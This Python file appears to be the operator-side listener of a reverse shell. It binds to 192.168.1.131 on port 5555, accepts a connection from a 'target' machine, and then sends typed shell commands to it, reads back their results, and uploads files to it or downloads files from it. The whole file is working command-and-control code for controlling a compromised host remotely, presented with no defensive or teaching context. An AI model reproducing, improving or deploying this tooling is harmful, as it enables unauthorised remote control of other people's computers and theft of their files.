import socket
import json
import os

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    with open(file_name, 'rb') as f:
        target.send(f.read())

def download_file(file_name):
    with open(file_name, 'wb') as f:
        target.settimeout(1)
        try:
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                chunk = target.recv(1024)
        except socket.timeout:
            pass
        target.settimeout(None)

def target_communication():
    while True:
        command = input(f'* Shell~{str(ip)}: ')
        reliable_send(command)
        if command == 'quit':
            break
        elif command[:3] == 'cd ':
            pass
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
        else:
            result = reliable_recv()
            print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.1.131', 5555))
sock.listen(5)
print('[+] Listening For The Incoming Connections')
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))
target_communication()
